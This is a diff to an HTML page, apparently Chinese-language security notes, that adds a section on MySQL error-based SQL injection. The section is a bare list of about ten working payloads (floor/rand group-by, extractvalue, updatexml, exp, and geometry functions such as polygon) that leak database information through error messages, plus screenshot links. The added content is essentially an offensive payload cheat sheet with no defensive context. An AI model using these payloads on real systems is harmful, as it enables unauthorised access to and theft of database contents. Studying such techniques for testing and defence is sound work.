@@ -83,6 +83,19 @@
 <p>示例谷歌</p>
 <p><img src="https://raw.githubusercontent.com/dks2757/tu/main/img/202401080919704.png" alt="img"></p>
 <p><img src="https://raw.githubusercontent.com/dks2757/tu/main/img/202401080919105.png" alt="img"></p>
+<p><strong>报错注入：</strong></p>
+<p><strong>(select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a)</strong></p>
+<p><strong>(extractvalue(1,concat(0x7e,(select user()),0x7e)))</strong></p>
+<p><strong>(updatexml(1,concat(0x7e,(select user()),0x7e),1))</strong></p>
+<p><strong>exp(~(select * from(select user())a))  常用</strong></p>
+<p><strong>geometrycollection((select * from(select * from(select user())a)b))</strong></p>
+<p><strong>multipoint((select * from(select * from(select user())a)b))</strong></p>
+<p><strong>polygon((select * from(select * from(select user())a)b))</strong></p>
+<p><strong>multipolygon((select * from(select * from(select user())a)b))</strong></p>
+<p><strong>linestring((select * from(select * from(select user())a)b))</strong></p>
+<p><strong>multilinestring((select * from(select * from(select user())a)b))</strong></p>
+<p><img src="https://raw.githubusercontent.com/dks2757/tu/main/img/202401080948878.png" alt="img"></p>
+<p><img src="https://raw.githubusercontent.com/dks2757/tu/main/img/202401080948958.png" alt="img"></p>
 
     </div>
 
